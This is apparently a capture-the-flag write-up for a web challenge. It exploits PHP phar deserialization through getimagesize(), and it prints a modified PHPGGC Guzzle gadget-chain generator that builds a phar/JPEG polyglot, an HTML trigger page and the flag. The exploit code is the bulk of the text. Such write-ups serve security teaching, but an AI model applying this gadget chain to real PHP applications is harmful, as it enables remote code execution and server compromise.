# Web 05
The challenge has source code (luckily).

We can trigger deserialization because of following vulnerable code:
```
        try {
            if ($imageInfo['Height'] && $imageInfo['Width']) {
                $height = $imageInfo['Height'];
                $width = $imageInfo['Width'];
            } else {
                list($width, $height) = getimagesize($image);
            }
            
```
`getimagesize()` accepts attacker controllable URI. If we pass `phar://` scheme it would trigger phar deserialization.

One more thing we need to care of is our phar archive must be a valid image (or at least look like it). There's a known solution for this problem.

The server uses `http guzzle` that again, fortunately for us, has needed gadget achieve RCE on the server.
The `php-ggc` framework contains a generator code that is changed so that it would generate phar/image polyglot.

The modified code is shown below:
```
<?php

namespace GadgetChain\Guzzle;

class FW1 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '6.0.0 <= 6.3.3+';
    public static $vector = '__destruct';
    public static $author = 'cf';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];
        $a =  new \GuzzleHttp\Cookie\FileCookieJar($path, $data);
        //unlink('pwn.phar');
        $p = new \Phar('pwn.phar', 0); 
        $p['file.txt'] = 'test';
        $p->setMetadata($a);
        $p->setStub("\xff\xd8\xff\xe0\x0a<?php __HALT_COMPILER(); ?>");
    }
}

```

We upload this "image" to server and record the path.
Then we generate html page that would point to it.
```
<html>
<head></head>
pwn image here
<img src=phar:///app/upload/af55k6peln8ni9270eut7i8uqr/73f2a4aa40cf38e647d802bc.jpg>
<body></body>
</html>
```
Then we fetch image from our server and get RCE.

## Flag
`WhiteHat{ph4r_d3_w1th_4_t1ny_b4ck_do0r_7fc88491}`
